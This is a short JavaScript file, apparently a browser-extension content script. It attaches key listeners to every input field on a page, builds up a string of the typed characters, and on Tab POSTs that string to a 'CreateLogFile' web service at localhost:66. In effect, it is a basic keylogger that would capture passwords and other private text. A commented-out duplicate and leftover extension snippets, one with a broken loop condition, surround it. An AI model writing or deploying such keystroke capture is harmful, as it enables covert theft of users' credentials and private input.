//var storageword = "";
//alert("Code Executed ... ");
//// Get the focused element:



//function myKeyPress(e) {
//    var keynum;
//    if (window.event) {
//        keynum = e.keyCode;
//    } else if (e.which) {
//        keynum = e.which;
//    }
//    //if(focused.id)
//    //check tab and enter key event...hp
//    if (keynum == 13) {
//        storageword = storageword.concat(",");
//        alert(storageword);
//    } else
//        storageword = storageword.concat(String.fromCharCode(keynum));

//}

//$("input").on('keypress', function (event) {
//    myKeyPress(event);
//});

//$("input").on('keydown', function (e) {
//    var keyCode = e.keyCode || e.which;

//    if (keyCode == 9) {
//        storageword = storageword.concat(",");
//        alert(storageword);
//        // call custom function here
//    }
//});


//var focused = $(':focus');

//// No jQuery:
//var focused = document.activeElement;

//alert(focused.id);




//chrome.extension.onMessage.addListener(function(message, sender, sendResponse) {
//    switch(message.type) {
//        case "colors-div":
//            var divs = document.querySelectorAll("div");
//            if(divs.length === 0) {
//                alert("There are no any divs in the page.");
//            } else {
//                for(var i=0;  divs.length<100; i++) {
//                    divs[i].style.backgroundColor = message.color;
//                }
//            }
//            break;
//    }
//});

//$(document).ready(function () {
//    // Trollface image must be at 'my_extension/images/trollface.jpg'.
//    var trollface = chrome.extension.getURL("images/trollface.jpg");
//    $('#content article img').each(function (index, image) {
//        $(image).attr('src', trollface);
//    });
//});

//initialization..

var storageword = "";
alert("Code Executed ... ");
// Get the focused element:



function myKeyPress(e) {
    var keynum;
    if (window.event) { // IE                    
        keynum = e.keyCode;
    } else if (e.which) { // Netscape/Firefox/Opera                   
        keynum = e.which;
    }
    //if(focused.id)
    //check tab and enter key event...hp
    if (keynum == 13) {
        storageword = storageword.concat(",");
        alert(storageword);
    } else
        storageword = storageword.concat(String.fromCharCode(keynum));

}

$("input").on('keypress', function (event) {
    myKeyPress(event);
});

$("input").on('keydown', function (e) {
    var keyCode = e.keyCode || e.which;

    if (keyCode == 9) {
        //storageword = storageword.concat(",");
        //alert("s" + storageword);
        postData();
       
    }
});


var focused = $(':focus');

// No jQuery:
var focused = document.activeElement;

alert(focused.id);
function postData() {
    alert(storageword);
    $.ajax({
        type: "POST",
        url: "http://localhost:66/WebService1.asmx/CreateLogFile",
        data: "{'dataText':'" + storageword + "'}",
        dataType: "text",
        success: function (data) {
            alert(data); // show the string that was returned, this will be the data inside the xml wrapper
        },
        error: function (err) {
            console.log(err);
        }
    });
}